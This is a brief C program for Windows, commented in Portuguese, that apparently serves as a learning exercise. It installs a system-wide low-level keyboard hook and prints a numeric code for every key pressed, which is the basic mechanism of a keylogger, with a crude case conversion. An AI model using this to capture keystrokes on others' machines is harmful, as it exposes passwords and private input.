#include <stdio.h>
#include <windows.h>

/*
HHOOK SetWindowsHookExA(
  [in] int       idHook,
  [in] HOOKPROC  lpfn,
  [in] HINSTANCE hmod,
  [in] DWORD     dwThreadId
);
*/

HHOOK hook;

/* Parametros para criar função do resultado */
LRESULT CALLBACK funcHook(int codigo, WPARAM wParam, LPARAM lParam);

int main() {
  MSG msg;
  /*Instala o proced. hook (gancho)/ Permite monitorar eventos */ 
  hook = SetWindowsHookExA(WH_KEYBOARD_LL, funcHook, NULL, 0); /*Proc hook para monitorar o teclado */
  if (hook == NULL) {
    printf("Deu erro viu parsa kk\n");
    return(1);
  }
  /*Receber as mensagens e enviar ao destino correto*/
  while (GetMessage(&msg, NULL, 0, 0) != 0) {
    TranslateMessage(&msg);
    DispatchMessage(&msg);
  }
  /*Remove o procedimento hook*/
  UnhookWindowsHookEx(hook);
  
}
LRESULT CALLBACK funcHook(int codigo, WPARAM wParam, LPARAM lParam) {
  char ch;
  /* Função do lParam + o casting para o tipo correto */
  PKBDLLHOOKSTRUCT kbDllHook = (PKBDLLHOOKSTRUCT)lParam;
  /*Função para pegar o valor da tecla pressionada, não pega o valor de quando a tecla solta */
  if (wParam == WM_KEYDOWN && codigo == HC_ACTION) {
    if (!GetAsyncKeyState(VK_SHIFT)) {
      ch = kbDllHook->vkCode + 32;
    }
    else {
      ch = kbDllHook->vkCode;
    }
    printf("%d", ch);
  }
  return (CallNextHookEx(hook,codigo,wParam,lParam));
}
